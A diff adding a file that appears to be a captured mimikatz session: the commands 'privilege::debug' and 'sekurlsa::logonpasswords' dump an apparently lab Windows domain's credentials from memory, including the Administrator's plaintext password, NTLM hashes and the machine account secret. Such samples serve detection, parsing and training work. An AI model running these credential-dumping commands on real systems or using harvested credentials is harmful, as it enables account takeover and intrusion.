@@ -1,0 +1,127 @@
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 395712 (00000000:000609c0)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : VDT
+Logon Server      : DC01
+Logon Time        : 6/3/2025 12:49:57 AM
+SID               : S-1-5-21-300591061-149275173-2848870365-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : VDT
+         * LM       : 49d58563113416eb9c5014ae4718a7ee
+         * NTLM     : 41291269bf30dc4c9270a8b888e3bbe9
+         * SHA1     : 556ece6a5d0e5d231e09e553a49dbf94afb523ea
+        tspkg :
+         * Username : Administrator
+         * Domain   : VDT
+         * Password : Abc12345
+        wdigest :
+         * Username : Administrator
+         * Domain   : VDT
+         * Password : Abc12345
+        kerberos :
+         * Username : Administrator
+         * Domain   : VDT.LOCAL
+         * Password : Abc12345
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 6/3/2025 12:49:51 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WS01$
+Domain            : VDT
+Logon Server      : (null)
+Logon Time        : 6/3/2025 12:49:51 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : WS01$
+         * Domain   : VDT
+         * NTLM     : 1e5a9503e3a17e719f4474161188c7c0
+         * SHA1     : 296ef28b6c359cd6bf44cb307f85a3a7444cf485
+        tspkg :
+        wdigest :
+         * Username : WS01$
+         * Domain   : VDT
+         * Password : E/2m 1Qj^nYFugZ-w]L3KB5T#/7g*ed^aDuQC);q]f;DeN^(&)&qnRFJ!S4qUG_W;ZZ2Y:[ZZ7"!aR<+t)lJPdn6e:28t%I.NCz-E=M 3LLui)ak<-d;)zh6
+        kerberos :
+         * Username : ws01$
+         * Domain   : VDT.LOCAL
+         * Password : E/2m 1Qj^nYFugZ-w]L3KB5T#/7g*ed^aDuQC);q]f;DeN^(&)&qnRFJ!S4qUG_W;ZZ2Y:[ZZ7"!aR<+t)lJPdn6e:28t%I.NCz-E=M 3LLui)ak<-d;)zh6
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 48249 (00000000:0000bc79)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 6/3/2025 12:49:51 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : WS01$
+         * Domain   : VDT
+         * NTLM     : 1e5a9503e3a17e719f4474161188c7c0
+         * SHA1     : 296ef28b6c359cd6bf44cb307f85a3a7444cf485
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WS01$
+Domain            : VDT
+Logon Server      : (null)
+Logon Time        : 6/3/2025 12:49:51 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS01$
+         * Domain   : VDT
+         * Password : E/2m 1Qj^nYFugZ-w]L3KB5T#/7g*ed^aDuQC);q]f;DeN^(&)&qnRFJ!S4qUG_W;ZZ2Y:[ZZ7"!aR<+t)lJPdn6e:28t%I.NCz-E=M 3LLui)ak<-d;)zh6
+        kerberos :
+         * Username : ws01$
+         * Domain   : VDT.LOCAL
+         * Password : E/2m 1Qj^nYFugZ-w]L3KB5T#/7g*ed^aDuQC);q]f;DeN^(&)&qnRFJ!S4qUG_W;ZZ2Y:[ZZ7"!aR<+t)lJPdn6e:28t%I.NCz-E=M 3LLui)ak<-d;)zh6
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
